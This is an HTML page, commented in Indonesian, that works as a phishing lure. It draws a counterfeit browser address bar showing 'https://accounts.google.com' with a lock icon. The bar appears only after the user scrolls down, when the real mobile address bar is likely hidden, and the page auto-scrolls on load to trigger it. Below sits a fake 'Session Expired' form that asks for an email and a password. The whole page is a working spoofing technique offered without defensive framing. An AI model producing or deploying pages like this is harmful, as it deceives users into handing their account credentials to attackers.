<!DOCTYPE html>
<html>
<head>
<title>Loading...</title>

<meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>
html, body {
    margin:0;
    padding:0;
    font-family: Arial, sans-serif;
}

/* spacer untuk scroll natural */
.spacer {
    height:1800px;
    background: linear-gradient(white, #ddd);
}

/* fake address bar */
#fakebar {
    position:fixed;
    top:0;
    left:0;
    width:100%;
    height:50px;
    background:#f1f3f4;
    border-bottom:1px solid #ccc;
    display:flex;
    align-items:center;
    padding:0 10px;
    font-size:14px;
    z-index:9999;
    opacity:0;
    transition:0.2s;
}

#fakebar.show {
    opacity:1;
}

.url {
    background:white;
    padding:6px 12px;
    border-radius:20px;
    border:1px solid #ccc;
    margin-left:10px;
    flex:1;
}

/* konten */
#content {
    padding:40px;
    text-align:center;
}

input {
    margin-top:20px;
    width:80%;
    padding:12px;
    font-size:16px;
    border-radius:20px;
    border:1px solid #ccc;
}
</style>

</head>

<body>

<div id="fakebar">
    🔒 <div class="url">https://accounts.google.com</div>
</div>

<div class="spacer"></div>

<div id="content">
    <h2>Session Expired</h2>
    <p>Please login again</p>
    <input type="text" placeholder="Email">
    <br>
    <input type="password" placeholder="Password">
</div>

<script>
let fakebar = document.getElementById("fakebar");

let lastScroll = 0;

// deteksi scroll natural
window.addEventListener("scroll", () => {
    let y = window.scrollY;

    // saat scroll turun cukup jauh → kemungkinan address bar hidden
    if (y > 150 && y > lastScroll) {
        fakebar.classList.add("show");
    }

    // kalau user scroll naik → hilangkan spoof
    if (y < lastScroll) {
        fakebar.classList.remove("show");
    }

    lastScroll = y;
});

// dorong user ke scroll awal (natural)
window.onload = () => {
    setTimeout(() => {
        window.scrollTo({ top: 250, behavior: "smooth" });
    }, 500);
};
</script>

</body>
</html>
